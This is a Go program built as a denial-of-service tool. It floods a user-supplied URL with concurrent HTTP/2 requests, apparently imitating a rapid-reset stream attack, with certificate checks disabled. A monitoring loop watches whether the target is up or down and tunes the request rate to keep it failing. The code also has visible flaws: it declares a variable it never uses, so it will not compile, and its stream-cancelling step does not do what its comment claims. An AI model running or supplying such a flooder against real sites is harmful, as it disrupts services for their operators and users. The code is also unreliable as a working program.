package main

import (
	"context"
	"crypto/tls"
	"flag"
	"fmt"
	"net/http"
	"os"
	"os/signal"
	"sync"
	"syscall"
	"time"

	"golang.org/x/net/http2"
)

var (
	url                  string
	limit                int
	sleepDuration        time.Duration
	sleepIncrease        = time.Millisecond * 10 // Amount to increase sleep by
	sleepDecrease        = time.Millisecond * 10 // Amount to decrease sleep by
	minSleep             = time.Millisecond * 10 // Minimum sleep duration
	maxSleep             = time.Second           // Maximum sleep duration
	downCheckInterval    = time.Second * 20
	upCheckInterval      = time.Second * 2
	downCheckAdjustCount = 10
)

func init() {
	flag.StringVar(&url, "url", "", "URL to send requests to")
	flag.IntVar(&limit, "limit", 1, "Limit on number of concurrent goroutines (0 for no limit)")
	flag.Parse()
	if url == "" {
		fmt.Println("Please specify a URL using the -url flag.")
		os.Exit(1)
	}
}

func worker(ctx context.Context, wg *sync.WaitGroup, jobs chan struct{}) {
	defer wg.Done()
	for {
		select {
		case <-ctx.Done():
			return
		case <-jobs:
			sendRequest(ctx)
		}
	}
}

func sendRequest(ctx context.Context) {
	client := &http.Client{
		Transport: &http2.Transport{
			TLSClientConfig: &tls.Config{InsecureSkipVerify: true},
		},
	}

	req, err := http.NewRequestWithContext(ctx, http.MethodGet, url, nil)
	if err != nil {
		return
	}

	// Send the request in a separate goroutine to allow closing the stream immediately
	go func() {
		_, err := client.Do(req)
	}()

	// Attempt to close the stream immediately
	if h2Transport, ok := client.Transport.(*http2.Transport); ok {
		h2Transport.CloseIdleConnections()
	}
}

func monitorSite(ctx context.Context, url string, statusChan chan time.Duration) {
	var (
		siteUp             bool
		prevSiteUp         bool
		firstCheck         = true
		sweetSpotFound     = false
		sweetSpotThreshold = time.Millisecond * 20
		downCheckCount     = 0
	)

	for {
		select {
		case <-ctx.Done():
			return
		default:
			client := &http.Client{
				Timeout: time.Second * 10, // Adjust timeout as needed
				Transport: &http2.Transport{
					TLSClientConfig: &tls.Config{InsecureSkipVerify: true},
				},
			}

			_, err := client.Get(url)
			siteUp = err == nil

			// Output a message if the site state has changed, or on the first check
			if siteUp != prevSiteUp || firstCheck {
				if siteUp {
					fmt.Println("The site is up")
				} else {
					fmt.Println("The site is down:", err)
				}
				sweetSpotFound = false // Reset sweet spot flag on state change
			}

			if !sweetSpotFound {
				if siteUp {
					sleepDuration -= sleepDecrease
					if sleepDuration < minSleep {
						sleepDuration = minSleep
					}
				} else {
					downCheckCount++
					if downCheckCount >= downCheckAdjustCount {
						sleepDuration += sleepIncrease
						if sleepDuration > maxSleep {
							sleepDuration = maxSleep
						}
						downCheckCount = 0 // Reset downCheckCount after adjusting sleepDuration
					}
				}

				// Check if the sleep duration adjustments are within the sweet spot threshold
				if sleepDuration > minSleep+sweetSpotThreshold && sleepDuration < maxSleep-sweetSpotThreshold {
					sweetSpotFound = true
					fmt.Println("Sweet spot found:", sleepDuration)
				}
			}

			statusChan <- sleepDuration

			if siteUp {
				time.Sleep(upCheckInterval)
			} else {
				time.Sleep(downCheckInterval)
			}

			prevSiteUp = siteUp
			firstCheck = false
		}
	}
}

func main() {
	var wg sync.WaitGroup

	// Create a context that we can cancel
	ctx, cancel := context.WithCancel(context.Background())

	// Catch interrupt signal for graceful shutdown
	c := make(chan os.Signal, 1)
	signal.Notify(c, os.Interrupt, syscall.SIGTERM)
	go func() {
		<-c
		fmt.Println("Stopping...")
		cancel() // Cancel the context to stop all goroutines
	}()

	// Create a channel to send work items to the workers
	jobs := make(chan struct{}, limit) // Buffered channel with capacity equal to the limit

	// Create a channel to communicate site status
	statusChan := make(chan time.Duration)

	// Start the site monitor goroutine
	go monitorSite(ctx, url, statusChan)

	// Create worker goroutines
	for i := 0; i < limit; i++ {
		wg.Add(1)
		go worker(ctx, &wg, jobs)
	}

	// Infinite loop to continuously send requests
	for {
		select {
		case <-ctx.Done():
			close(jobs) // Close the jobs channel to signal workers to exit
			wg.Wait()   // Wait for all workers to finish
			fmt.Println("All workers finished. Exiting.")
			return
		case newSleep := <-statusChan:
			sleepDuration = newSleep
		default:
			// Only send a new work item if there's room in the jobs channel
			select {
			case jobs <- struct{}{}: // Send a new work item to the workers
			default:
				// No room in the jobs channel; wait for a worker to become available
			}

			time.Sleep(sleepDuration) // Sleep to slow down requests if needed
		}
	}
}
